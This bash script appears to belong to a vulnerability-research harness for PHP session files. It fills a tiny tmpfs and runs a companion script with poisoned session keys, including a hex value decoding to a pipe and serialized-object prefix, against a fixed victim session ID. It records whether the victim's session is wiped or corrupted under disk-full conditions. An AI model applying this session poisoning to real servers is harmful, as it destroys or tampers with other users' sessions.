#!/bin/bash
# wp2_diskfull.sh - reject path + failed-write paths on a tiny tmpfs (angle 2)
CL=$(cd "$(dirname "$0")" && pwd)
ART=/tmp/p2s_c2
TINY=/tmp/p2s_c2/tiny
SID=vicsid00000000000000000000000
PIPE='4162637C4F3A3130'
NOPIPE='416263444546'

avail() { df --output=avail -B 1 "$TINY" | tail -1 | tr -d ' '; }

setup() { # leave N bytes free
  mountpoint -q "$TINY" && umount "$TINY"
  rm -rf "$TINY"; mkdir -p "$TINY"
  mount -t tmpfs -o size=256k tmpfs "$TINY" || { echo MOUNT-FAILED; exit 1; }
  dd if=/dev/zero of="$TINY/fill.bin" bs=1 count=$((256*1024 - "$1")) 2>/dev/null
  echo "  [setup] avail=$(avail)"
}

BIGHEX=$(python3 -c 'print(("big|s:150000:\"" + "K"*150000 + "\";").encode().hex())')
echo "BIGHEX len=${#BIGHEX}"

echo "== dfA: pipe key reject, victim present, ~8KB free =="
setup 8192
TAG=dfA_pipe POISON="$PIPE" FILESIZE=4096 SAVEPATH="$TINY" bash "$CL/wp2_shot.sh"
echo "  avail=$(avail) size=$(stat -c %s "$TINY/sess_$SID" 2>/dev/null || echo -1)"

echo "== dfB: pipe key, upload_tmp_dir INSIDE tiny fs (~5KB free, 4KB file) =="
setup 5120
TAG=dfB_pipe_tmptiny POISON="$PIPE" FILESIZE=4096 SAVEPATH="$TINY" UPLOADTMP="$TINY" bash "$CL/wp2_shot.sh"
echo "  avail=$(avail) size=$(stat -c %s "$TINY/sess_$SID" 2>/dev/null || echo -1)"

echo "== dfB2: same but upload needs MORE than free (64KB file vs 5KB) =="
setup 5120
TAG=dfB2_pipe_enospc_mid POISON="$PIPE" FILESIZE=65536 SAVEPATH="$TINY" UPLOADTMP="$TINY" bash "$CL/wp2_shot.sh"
echo "  avail=$(avail) size=$(stat -c %s "$TINY/sess_$SID" 2>/dev/null || echo -1)"

echo "== dfC: no-pipe key, 150KB victim, only ~8KB free -> cleanup write ENOSPC =="
setup 8192
TAG=dfC_nopipe_enospc_write POISON="$NOPIPE" FILESIZE=4096 SAVEPATH="$TINY" VICTIM=custom VICTIM_HEX="$BIGHEX" bash "$CL/wp2_shot.sh"
echo "  avail=$(avail) size=$(stat -c %s "$TINY/sess_$SID" 2>/dev/null || echo -1)"

echo "== dfD: pipe key + 150KB victim + ~8KB free -> reject wipe wins over ENOSPC =="
setup 8192
TAG=dfD_pipe_bigvictim POISON="$PIPE" FILESIZE=4096 SAVEPATH="$TINY" VICTIM=custom VICTIM_HEX="$BIGHEX" bash "$CL/wp2_shot.sh"
echo "  avail=$(avail) size=$(stat -c %s "$TINY/sess_$SID" 2>/dev/null || echo -1)"

echo "== dfE: pipe key, completely full fs, 0-byte victim =="
setup 0
TAG=dfE_full POISON="$PIPE" FILESIZE=4096 SAVEPATH="$TINY" bash "$CL/wp2_shot.sh"
echo "  avail=$(avail) size=$(stat -c %s "$TINY/sess_$SID" 2>/dev/null || echo -1)"

umount "$TINY"
echo DISKFULL-DONE
